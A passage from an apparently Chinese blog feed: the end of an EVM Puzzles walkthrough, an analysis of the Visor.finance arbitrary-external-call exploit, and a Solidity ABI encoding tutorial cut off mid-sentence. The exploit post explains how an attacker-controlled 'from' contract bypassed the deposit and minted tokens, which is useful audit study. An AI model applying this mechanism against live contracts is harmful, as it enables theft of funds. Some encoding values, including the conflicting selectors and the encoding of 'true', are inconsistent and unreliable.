<span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>所以如果要顺利执行 <strong>JUMPI</strong> 的话，就需要<code>CALLVALUE * CALLDATASIZE == 8</code>，而又需要 <code>CALLDATAVALUE &gt; 3</code>，因此我们传入的 <strong>CALLVALUE</strong> 和 <strong>CALLDATASIZE</strong> 分别是 2 和 4（0x11223344）</p><h3 id="Puzzle-10"><a href="#Puzzle-10" class="headerlink" title="Puzzle 10"></a>Puzzle 10</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#############</span></span><br><span class="line"><span class="comment"># Puzzle 10 #</span></span><br><span class="line"><span class="comment">#############</span></span><br><span class="line"></span><br><span class="line">00      38          CODESIZE</span><br><span class="line">01      34          CALLVALUE</span><br><span class="line">02      90          SWAP1</span><br><span class="line">03      11          GT</span><br><span class="line">04      6008        PUSH1 08</span><br><span class="line">06      57          JUMPI</span><br><span class="line">07      FD          REVERT</span><br><span class="line">08      5B          JUMPDEST</span><br><span class="line">09      36          CALLDATASIZE</span><br><span class="line">0A      610003      PUSH2 0003</span><br><span class="line">0D      90          SWAP1</span><br><span class="line">0E      06          MOD</span><br><span class="line">0F      15          ISZERO</span><br><span class="line">10      34          CALLVALUE</span><br><span class="line">11      600A        PUSH1 0A</span><br><span class="line">13      01          ADD</span><br><span class="line">14      57          JUMPI</span><br><span class="line">15      FD          REVERT</span><br><span class="line">16      FD          REVERT</span><br><span class="line">17      FD          REVERT</span><br><span class="line">18      FD          REVERT</span><br><span class="line">19      5B          JUMPDEST</span><br><span class="line">1A      00          STOP</span><br></pre></td></tr></table></figure><p>还是先学习一下新的操作码：</p><ul><li><strong>GT</strong>：从堆栈中弹出 2 个值并判断<code>value0 &lt; value1</code>，如果结果为 true 则压入 1，否则压入 0</li><li><strong>MOD：</strong>从堆栈中弹出 2 个值并将结果其运算<code>value0 % value1</code>。若分母 ( <code>value1</code>) 是<code>0</code>则结果为 0</li><li><strong>ISZERO：</strong>从堆栈中弹出一个值并判断`value0 === 0，将判断结果压入栈</li></ul><p>在执行完 <strong>SWAP1</strong> 后栈中的结构如下</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[1b callvalue <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>GT</strong> 指令，如果要顺利执行 <strong>JUMPI</strong>，就是需要 <strong>GT</strong> 指令返回的值为 1，因此我们输入的 <strong>CALLVALUE</strong> 必须要小于 1b(27)，然后就会跳到第 8 条指令。</p><p>接着执行</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">CALLDATASIZE </span><br><span class="line">PUSH2 0003</span><br><span class="line">SWAP1</span><br></pre></td></tr></table></figure><p>以上指令将 CALLDATA 的大小和 0003 压入栈中，并交换他们的位置，此时栈中的结构为</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[calldata_size <span class="number">3</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>然后会执行 <strong>MOD</strong> 指令，该指令会进行取模运算，将得到结果压入栈中，紧接着执行 <strong>ISZERO</strong> 指令，判断栈顶元素的值是否为 0。然后继续往下执行，当执行到 <strong>JUMPI</strong>  时，栈中的结构为：</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[0A+CALLVALUE ISZERO_result  <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">0</span>]</span><br></pre></td></tr></table></figure><p>由于需要继续往下执行 <strong>JUMPI</strong> ，所在在这里的 <strong>ISERO_result</strong> 的值必须为 1，即意味着上边 <strong>MOD</strong> 运算的结果为 0，且<code>0A+CALLVALUE ISZERO_result == 0x19(25)</code>，所以 <strong>CALLVALUE</strong> 的值为 15，<strong>CALLDATASIZE</strong> 的值为 0 即可。</p><p><img src="/images/evm-puzzles.assets/image-20220728135037244.png" alt="image-20220728135037244"></p><p>到这里就完成了所有的题目，在完成这些题目的过程中既掌握了不少 EVM opcode 的用法，也了解了 EVM 的基本运行机制。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Evm-puzzles 是一个以太坊操作码的挑战，每道题都会提供一些列操作码，并提示输入正确的交易值或者调用数据。通过Evm-puzzles可以了解EVM操作码的运行机制&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/evm-puzzles.assets/image-2</summary>
      
    
    
    
    <category term="Solidity" scheme="https://banana69.site/categories/Solidity/"/>
    
    
    <category term="Solidity" scheme="https://banana69.site/tags/Solidity/"/>
    
  </entry>
  
  <entry>
    <title>从 Visor.finance 事件学习任意外部调用漏洞</title>
    <link href="https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/"/>
    <id>https://banana69.site/2022/03/25/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/</id>
    <published>2022-03-25T04:42:54.000Z</published>
    <updated>2022-03-25T06:47:55.756Z</updated>
    
    <content type="html"><![CDATA[<h3 id="攻击分析"><a href="#攻击分析" class="headerlink" title="攻击分析"></a>攻击分析</h3><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221429315.png" alt="image-20220320221429315"></p><p>首先查看攻击交易：</p><p><a href="https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f">https://etherscan.io/tx/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320221534097.png" alt="image-20220320221534097"></p><p>可以看到从0地址俩次转出大量的vVISR代币，由于<strong>0地址不会主动转账或者授权配额</strong>，所以可以猜测这些vVISR代币是mint出来的。</p><p>然后使用blocksec的交易分析工具分析，<a href="https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f%EF%BC%8C%E4%BD%BF%E7%94%A8">https://versatile.blocksecteam.com/tx/eth/0x69272d8c84d67d1da2f6425b339192fa472898dce936f24818fda415c1c1ff3f，使用</a> invocation flow 功能可以查看调用关系，对其中的地址和函数进行查询找到标签，然后使用<code>customize account map</code>功能，将其替换为自定义标签，可以提高调用关系的可读性。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222843697.png" alt="image-20220320222843697"></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320222945110.png" alt="image-20220320222945110"></p><p>自定义后的标签为：</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">&quot;0x0000000000000000000000000000000000000000&quot;</span>: <span class="string">&quot;Null Address: 0x000…000&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x8efab89b497b887cdaa2fb08ff71e4b3827774b2&quot;</span>: <span class="string">&quot;Visor Finance Exploiter&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0xf938424f7210f31df2aee3011291b658f872e91e&quot;</span>: <span class="string">&quot;Visor Finance: VISR Token&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;0xc9f27a50f82571c1c8423a42970613b8dbda14ef&quot;</span>: <span class="string">&quot;Visor Finance RewardsHypervisor&quot;</span>,</span><br><span class="line">    <span class="attr">&quot;0x3a84ad5d16adbe566baa6b3dafe39db3d5e261e5&quot;</span>: <span class="string">&quot;vVISR&quot;</span>,</span><br><span class="line"> <span class="attr">&quot;0x10c509aa9ab291c76c45414e7cdbd375e1d5ace8&quot;</span>: <span class="string">&quot;Exploit contract&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>替换标签后的调用关系图为：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220320223428363.png" alt="image-20220320223428363"></p><p>攻击步骤：</p><ol><li>攻击合约的<code>0x4a0b0c38</code>匿名函数调用了<code>Visor Finance RewardsHypervisor</code>合约中的<code>deposit</code>函数，把攻击合约的地址和攻击者的地址作为参数传入；</li><li>在调用<code>deposit</code>函数后，又回调了攻击合约的<code>owner，dekegatedTransferERC20</code>函数；</li><li>在<code>dekegatedTransferERC20</code>函数中重入到了<code>Visor Finance RewardsHypervisor</code>合约并且调用了<code>deposit</code>函数.</li></ol><p>在清楚了攻击流程之后可以推测出<code>RewardsHypervisor </code>合约的 <strong>deposit</strong> 函数内存在<strong>任意外部调用漏洞</strong>。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>查看<code>RewardsHypervisor</code> 合约的开源代码：</p><p><a href="https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code">https://etherscan.io/address/0xc9f27a50f82571c1c8423a42970613b8dbda14ef/advanced#code</a></p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321080927216.png" alt="image-20220321080927216"></p><p>这段代码的逻辑是存入一定数量的<code>visr</code>就会mint出一定数量的<code>vvsir</code>给用户，<code>vvsir</code>为流动性代币，且函数 <code>deposit</code>为 external，可以被外部调用。</p><p>代码分析：</p><ol><li><p>参数<code>visrDeposit</code>为声明存入的<code>Visr</code>的数量；参数<code>from</code>为 visr 来源地址；参数<code>to</code>为 接受 vvsir 的地址；</p></li><li><p>返回值<code>share</code>为 <strong>mint</strong> 出的 vvsir 数量；</p></li><li><p>46-48行判断：存入的 <code>Visr</code>数量必须大于0，且不能讲 mint 的流动性代币发送到 0 地址或者此合约（Visor Finance RewardsHypervisor）的地址；</p></li><li><p>51-54行：如果代币<code>vvisr</code>代币的总供应量不为 0， 那么计算此合约中的 <code>visr</code>的余额（这个合约本身持有<code>visr</code>代币），根据比例计算出需要 <strong>mint</strong> 出的 <code>vvsir</code>的数量，53行为需要 <strong>mint</strong> 的 <code>vvsir</code>的数量<code>share = (visrDeposit / visrBalance) * vvisr总量</code>；</p><p><code>mul(x,y) = x * y, div(x, y) = x / y</code></p><p><code>share.mul(a) = share * a, share.div(a) = share / a</code></p></li><li><p>56-61行：判断发送<code>visr</code>的地址是否为合约地址，如果是合约地址，则检查 <strong>msg.sender</strong> 是不是合约的 <strong>owner</strong>，然后要求这个合约实现 <code>IVsior</code>接口，调用<code>from</code> 的<code>delegatedTransferERC20</code>函数，从<code>from</code>地址向当前合约地址发送<code>visrDeposit</code>数量的 visr。</p><p>由于对 <strong>from</strong> 未作出任何限定，所以 <strong>from</strong> 可以是任何合约。攻击者只需要定义一个<code>delegatedTransferERC20</code>函数就可以绕过充值直接 <strong>mint</strong>。</p></li><li><p>如果 <strong>from</strong> 不是合约地址，就调用 <code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 给自己。</p></li><li><p>转入<strong>vvisr</strong> 以后可以调用 <code>withdraw</code>函数将其转换成 <strong>visr</strong>，然后在市场上售卖完成变现。</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321132601411.png" alt="image-20220321132601411"></p></li></ol><p> <code>IVsior</code>接口说明：</p><p><img src="/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E/image-20220321113438989.png" alt="image-20220321113438989"></p><p> <code>IVsior</code>接口就是要求合约转账，这个函数的主要问题在于56-59行中，若传入的地址是合约，那么检测传入 <code>visr</code>的合约地址的 <strong>owner</strong> 是 <strong>msg.sender</strong> ，然后调用 <strong>from</strong> 的 <code>delegatedTransferERC20</code>函数，本意是检测 <strong>msg.sender</strong> 的授权转账。</p><ul><li><p><strong>问题 1:</strong></p><p>因为 <strong>from</strong> 可以是自己实现的合约，所以攻击者可以自己实现 <code>delegatedTransferERC20</code>函数，可以不实现转账并且满足<code>require</code>，并且<code>Hypervisior</code>合约本身就有钱，可以根据参数<code>visrDeposit</code>计算出最后 <strong>mint</strong> 出的 <code>vvisr</code>值发送给攻击者。</p></li><li><p><strong>问题 2:</strong></p><p>判断 <strong>from</strong> 不是合约地址时，<code>visr.safeTransferFrom</code>函数，由于传入的 <strong>from</strong> 参数和 <strong>to</strong> 参数可控，意味着可以用别人授权给 <strong>RewardsHypervisor</strong> 合约的 <strong>visr</strong> 充值进去，再 <strong>mint vvisr</strong> 最后发送给攻击者。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;攻击分析&quot;&gt;&lt;a href=&quot;#攻击分析&quot; class=&quot;headerlink&quot; title=&quot;攻击分析&quot;&gt;&lt;/a&gt;攻击分析&lt;/h3&gt;&lt;p&gt;&lt;img src=&quot;/image/%E4%BB%BB%E6%84%8F%E5%A4%96%E9%83%A8%E8%B0%83</summary>
      
    
    
    
    <category term="智能合约" scheme="https://banana69.site/categories/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6/"/>
    
    
    <category term="智能合约审计" scheme="https://banana69.site/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Solidity函数选择器与参数编码</title>
    <link href="https://banana69.site/2021/10/17/Solidity%20Function%20Selector/"/>
    <id>https://banana69.site/2021/10/17/Solidity%20Function%20Selector/</id>
    <published>2021-10-17T07:21:46.000Z</published>
    <updated>2022-04-23T15:12:31.560Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-Basic-Design"><a href="#0x01-Basic-Design" class="headerlink" title="0x01 Basic Design"></a>0x01 Basic Design</h4><p><strong>ABI (Application Binary Interface，应用二进制接口)</strong> 是以太坊生态系统中从区块链外部与合约进行交互以及合约间进行交互的一种方式。数据会根据其类型按照这份手册中说明的方法进行编码。</p><p>通常，ABI 是俩个程序模块之间的接口，其中之一通常处于机器代码级别，接口是将数据编码/解码到机器代码中(从机器代码中解码出来)的方法。在以太坊中，它是如何编码 Solidity 合约调用以及如何从交易中读取数据的基础。</p><h4 id="0x02-Function-Selector"><a href="#0x02-Function-Selector" class="headerlink" title="0x02 Function Selector"></a>0x02 Function Selector</h4><p>为了能够在以太坊上部署智能合约，合约函数被编译成 <strong>EVM</strong> 字节码，并添加了一段称为函数选择器的代码，作为合约代码的入口点。</p><p>一个函数调用数据的前 <strong>4</strong> 字节，指定了要调用的函数。这就是某个函数签名的 <strong>Keccak</strong> 哈希的前 4 字节（高位在左的大端序）。例如，<code>bytes4(keccak256(&#39;balanceOf(address)&#39;)) == 0x70a08231</code> 这种形式，<code>0x70a08231</code> 便是<code>balanceOf(address)</code>的 <strong>Function Selector</strong>。</p><ul><li>基础原型即是函数名称加上由括号括起来的参数类型列表，参数类型间由一个逗号分隔开，且没有空格；</li><li>对于 <strong>uint</strong> 类型，要转成 <strong>uint256</strong> 进行计算，比如 <code>ownerOf(uint256)</code> 其 <strong>Function Selector =</strong> <code>bytes4(keccak256(&#39;ownerOf(uint256)&#39;)) == 0x6352211e</code>；</li><li>函数参数包含结构体，相当于把结构体拆分成单个参数，只不过这些参数用 <code>()</code> 扩起来，详细可看下面的例子。</li></ul><p>给出以下例子：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint public x;</span><br><span class="line">    function test1(bytes3) public &#123;x = 1;&#125;</span><br><span class="line">    function test2(bytes3[2] memory) public  &#123; x = 1; &#125;</span><br><span class="line">    function test3(uint32 x, bool y) public  &#123; x = 1; &#125;</span><br><span class="line">    function test4(uint, uint32[] memory, bytes10, bytes memory) public &#123; x = 1; &#125;</span><br><span class="line">    function test5(uint, Test memory test) public &#123; x = 1; &#125;</span><br><span class="line">    function test6(uint, Test[] memory tests) public &#123; x = 1; &#125;</span><br><span class="line">    function test7(uint[][] memory,string[] memory) public &#123; x = 1; &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 函数选择器</span><br><span class="line">&#123;</span><br><span class="line">    &quot;0d2032f1&quot;: &quot;test1(bytes3)&quot;,</span><br><span class="line">    &quot;2b231dad&quot;: &quot;test2(bytes3[2])&quot;,</span><br><span class="line">    &quot;92e92919&quot;: &quot;test3(uint32,bool)&quot;,</span><br><span class="line">    &quot;4d189ce2&quot;: &quot;test4(uint256,uint32[],bytes10,bytes)&quot;,</span><br><span class="line">    &quot;4ca373dc&quot;: &quot;test5(uint256,(string,string,uint256))&quot;,</span><br><span class="line">    &quot;ccc5bdd2&quot;: &quot;test6(uint256,(string,string,uint256)[])&quot;,</span><br><span class="line">    &quot;cc80bc65&quot;: &quot;test7(uint256[][],string[])&quot;,</span><br><span class="line">    &quot;0c55699c&quot;: &quot;x()&quot;</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//计算函数选择器</span><br><span class="line">function selector() public view returns (bytes4) &#123;</span><br><span class="line">return this.test1.selector;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h4 id="0x03-Argument-Encoding"><a href="#0x03-Argument-Encoding" class="headerlink" title="0x03 Argument Encoding"></a>0x03 Argument Encoding</h4><p>从第 <strong>5</strong> 个字节开始是被编码的参数。这种编码也被用在其他地方，比如，返回值和事件的参数也会被用同样的方式进行编码，而用来指定函数的 <strong>4</strong> 个字节则不需要再进行编码。</p><ul><li><p>基础类型：</p><ul><li><p><code>uint&lt; M &gt;</code> ： M 位的无符号整数，0 &lt; M &lt;= 256、M % 8 == 0；</p></li><li><p><code>int&lt; M &gt;</code>：以 2 为补码作为符号的 M 位整数，0 &lt; M &lt;= 256、M % 8 ==0；</p></li><li><p><code>address</code>：除了表示地址类型外，还等价于 uint160，在计算和函数选择器中通常使用 address；</p></li><li><p><code>bool</code>：等价于 uint8，取值为 0 或 1，在计算和函数选择器中通常使用 bool；</p></li><li><p><code>ixed&lt; M &gt;x&lt; N &gt;</code>：M 位的有符号固定小数位的是十进制数字，8 &lt;= M &lt;= 256、M % 8 == 0、且 0 &lt; N &lt;= 80，</p></li><li><p><code>fixed、ufixed</code>：fixed128x18 和 ufixed128x18 的同义词，在计算和函数选择器中通常使用 fixed128x18 和 ufixed128x18；</p></li><li><p><code>bytes&lt; M &gt;</code>：M 字节的二进制类型，0 &lt; M &lt;= 32；</p></li><li><p><code>function</code>：一个地址（20字节）后跟一个函数选择器（4字节），编码之后等价于bytes24.</p></li></ul></li><li><p>定长数组类型：</p><p><code>&lt; type &gt;[M]</code>：有 M 个元素的定长数组，M &gt;= 0，数组元素为给定类型。</p></li><li><p>非定长类型：</p><ul><li><code>bytes</code>：动态大小的字节序列。</li><li><code>string</code>：动态大小的 unicode 字符串，通常呈现为 UTF-8 编码。</li><li><code>&lt;type&gt;[]</code>：元素为给定类型的变长数组。</li></ul><p>可以将若干类型放到一对括号中，用逗号分隔开，以此来构成一个 元组tuple：</p><ul><li><code>(T1,T2,...,Tn)</code>：由 <code>T1</code>，…，<code>Tn</code>，<code>n &gt;= 0</code> 构成的 元组tuple。</li></ul></li></ul><ul><li><p>对参数的编码具有以下属性：</p><p>1、读取的次数取决于参数数组结构中的最大深度；也就是说，要取得 <code>a_i[k][l][r]</code> 需要读取 <strong>4</strong> 次。在先前的 <strong>ABI</strong> 版本中，在最糟的情况下，读取的次数会随着动态参数的总数而线性地增长。</p><p>2、一个变量或数组元素的数据，不会被插入其他的数据，并且是可以再定位的；也就是说，它们只会使用相对的 “地址”。</p></li><li><p>还需要区分静态和动态类型：</p><p>以下类型被称为<strong>动态</strong>：</p><ul><li><code>bytes</code></li><li><code>string</code></li><li>任意类型 T 的变长数组 <code>T[]</code></li><li>任意动态类型 T 的定长数组 <code>T[k]</code> （<code>k &gt;= 0</code>）</li><li>由动态的 <code>Ti</code> （<code>1 &lt;= i &lt;= k</code>）构成的 元组元组 <code>(T1,...,Tk)</code></li></ul><p>而所有非动态类型被称为<strong>静态</strong>。</p><p>静态类型会被直接编码，动态类型会在当前数据块之后单独分配的位置被编码。</p><p>参考动态类型的编码原理；<a href="https://ctf-wiki.org/blockchain/ethereum/selector-encoding/">https://ctf-wiki.org/blockchain/ethereum/selector-encoding/</a></p><ul><li>动态类型的数据，比如动态数组，结构体，变长字节，其编码后存储其<code>offset、length、data</code><ul><li>先把参数顺序存储：如果是定长数据类型，直接存储其 <code>data</code>，如果是变长数据类型，先存储其 <code>offset</code></li><li>顺序遍历变长数据：先存储 <code>offset</code>，对于第一个变长数据，先存储其 <code>offset = 0x20 * number</code> ( <code>number</code> 是函数参数的个数 )；对于下一个变长数据，其 <code>offset = offset_of_prev + 0x20 + 0x20 * number</code> (第一个 <code>0x20</code> 是存储前一个变长数据的长度占用的大小，<code>number</code> 是前一个变长数据的元素个数)</li><li>顺序遍历变长数据：存储完 <code>offset</code> ，接着就是遍历每个变长数据，分别存储其 <code>length</code> 和 <code>data</code></li><li>( <code>ps:</code> 对于结构体这样的类型，存储的时候可把结构体内元素看成是一个新函数的参数，这样的话，对于结构体中的第一个变长数据，其 <code>offset = 0x20 * num</code> ，<code>num</code> 是结构体元素的个数 )</li></ul></li></ul></li></ul><ul><li>一般来说大体而言，一个以 <code>a_1, ..., a_n</code> 为参数的对 <code>f</code> 函数的调用，会被编码<code>function_selector(f) enc((a_1, ..., a_n))</code>，<code>f</code> 的返回值 <code>v_1, ..., v_k</code> 会被编码为<code>enc((v_1, ..., v_k))</code>，也就是说，返回值会被组合为一个元组进行编码。</li></ul><h4 id="0x04-例子："><a href="#0x04-例子：" class="headerlink" title="0x04 例子："></a>0x04 例子：</h4><h6 id="例1："><a href="#例1：" class="headerlink" title="例1："></a>例1：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.4.16 &lt;0.9.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">contract Demo &#123;</span><br><span class="line">    struct Test &#123;</span><br><span class="line">        string name;</span><br><span class="line">        string policies;</span><br><span class="line">        uint num;</span><br><span class="line">    &#125;</span><br><span class="line">    uint public x;</span><br><span class="line">    function test(uint, uint32[] memory, bytes10, bytes memory) public &#123; </span><br><span class="line">    x = 1; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>针对以上合约的函数，其函数调用的最终编码为：</p><ul><li><p><code>test(0x123,[&quot;0x11221122&quot;,&quot;0x33443344&quot;],&quot;0x31323334353637383930&quot;,&quot;0x3132333435&quot;)</code></p><ul><li><p>函数选择器：<code>0xa5643bf2</code>，源自<code>test(uint,uint32,bytes10,bytes)</code>的签名；</p></li><li><p>第一个参数 <strong>uint</strong>（静态类型），直接存储其值：<code>0x0000000000000000000000000000000000000000000000000000000000000123</code>；</p></li><li><p>第二个参数 **uint32 []**（动态数组），先存储其 <strong>offset=0x20*4</strong>（4 是参数个数）：<code>0x0000000000000000000000000000000000000000000000000000000000000080</code>；</p></li><li><p>第三个参数 <strong>bytes10</strong>（静态类型），直接存储其值（从低位开始补0）：<code>0x313233343536373839300000000000000000000000000000000000000000000</code>；</p></li><li><p>第四个参数 <strong>bytes</strong>（动态类型），先存储其 <strong>offset=0x80+0x20*3=0xe0（需要加上前一个动态类型参数的offse，3是前一个动态类型存储其长度和俩个元素占用的插槽个数）</strong>：<code>0x00000000000000000000000000000000000000000000000000000000000000e0</code>;</p></li></ul></li><li><p>在存储完静态类型的 <strong>data</strong> 和动态类型的 <strong>offset</strong> 后，开始存储变长类型的 <strong>length</strong> 和 <strong>data</strong>：</p><ul><li>第二个参数的长度（<strong>length</strong>）：<code>0x0000000000000000000000000000000000000000000000000000000000000002</code>;</li><li>第二个参数的第一个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000011221122</code>;</li><li>第二个参数的第二个数组元素：<code>0x0000000000000000000000000000000000000000000000000000000033443344</code>;</li><li>第四个参数的长度（<strong>length</strong>），5个字节：<code>0x0000000000000000000000000000000000000000000000000000000000000005</code>；</li><li>第四个参数的数据部分（从低位补0）：<code>0x3132333435000000000000000000000000000000000000000000000000000000</code>。</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x577563b6                                                             // function selector</span><br><span class="line">0 - 0x0000000000000000000000000000000000000000000000000000000000000123 // data of first parameter</span><br><span class="line">1 - 0x0000000000000000000000000000000000000000000000000000000000000080 // offset of second parameter</span><br><span class="line">2 - 0x3132333435363738393000000000000000000000000000000000000000000000 // data of third parameter</span><br><span class="line">3 - 0x00000000000000000000000000000000000000000000000000000000000000e0 // offset of forth parameter</span><br><span class="line">4 - 0x0000000000000000000000000000000000000000000000000000000000000002 // length of second parameter</span><br><span class="line">5 - 0x0000000000000000000000000000000000000000000000000000000011221122 // first data of second parameter</span><br><span class="line">6 - 0x0000000000000000000000000000000000000000000000000000000033443344 // second data of second parameter</span><br><span class="line">7 - 0x0000000000000000000000000000000000000000000000000000000000000005 // length of forth parameter</span><br><span class="line">8 - 0x3132333435000000000000000000000000000000000000000000000000000000 // data of forth parameter</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="例2："><a href="#例2：" class="headerlink" title="例2："></a>例2：</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">contract Foo &#123;</span><br><span class="line">  function bar(bytes3[2]) public pure &#123;&#125;</span><br><span class="line">  function baz(uint32 x, bool y) public pure returns (bool r) &#123; </span><br><span class="line">  r = x &gt; 32 || y; </span><br><span class="line">  &#125;</span><br><span class="line">  function sam(bytes, bool, uint[]) public pure &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>对于以上合约使用参数 <strong>69</strong> 和 <strong>true</strong> 去调用 <strong>baz</strong>，一共需要传送 <strong>68</strong> 字节，其函数调用的最终编码为：</p><ul><li>函数选择器：<code>0xcdcd77c0</code>，这源自ASCII格式的 <code>baz(uint32,bool)</code> 签名的 <strong>keccak</strong> 哈希的前 4 字节。</li><li>第一个参数，一个被用 0 值字节补充到 32 字节的 uint32 值 <code>69</code>（hex(69)）：<code>0x0000000000000000000000000000000000000000000000000000000000000045</code>：。</li><li>第二个参数，一个被用 0 值字节补充到 32 字节的 boolean 值 <code>true</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000001</code>：。</li></ul><p>合起来就是:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0xcdcd77c000000000000000000000000000000000000000000000000000000000000000450000000000000000000000000000000000000000000000000000000000000001</span><br></pre></td></tr></table></figure></li><li><p>使用<code>dave、ture、[1,2,3]</code>作为参数调用 <strong>sam</strong>，一共需要传送 <strong>292</strong> 字节。</p><ul><li>函数选择器：<code>0xa5643bf2</code>，源自<code>sam(bytes,bool,uint256[])</code>的签名；</li><li>第一个参数（动态类型）的数据部分的位置（从参数编码块开始算起的字节数）：<code>0x0000000000000000000000000000000000000000000000000000000000000060</code>；</li><li>第二个参数（bool 类型的 trure）：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第三个参数（动态类型）的数据部分的位置，由字节数计量，这里是<code>0x0a</code>：<code>0x00000000000000000000000000000000000000000000000000000000000000a0</code>；</li><li>第一个参数的数据部分，以字节数组的元素个数作为开始，这里是<code>4</code>：<code>0x0000000000000000000000000000000000000000000000000000000000000004</code>;</li><li>第一个参数的内容（dave）的 UTF-8 